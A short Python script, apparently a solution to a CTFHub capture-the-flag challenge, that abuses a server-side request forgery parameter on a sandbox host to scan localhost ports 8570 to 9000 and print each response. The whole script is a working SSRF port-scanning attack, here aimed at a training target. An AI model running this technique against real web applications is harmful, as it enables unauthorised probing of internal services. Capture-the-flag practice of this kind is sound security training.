import requests

url = 'http://challenge-9378d08cfa1a8440.sandbox.ctfhub.com:10800/?url=127.0.0.1:8000'
for index in range(8570, 9001):
    url_1 = f'http://challenge-9378d08cfa1a8440.sandbox.ctfhub.com:10800/?url=127.0.0.1:{index}'
    res = requests.get(url_1)
    print(index, res.text)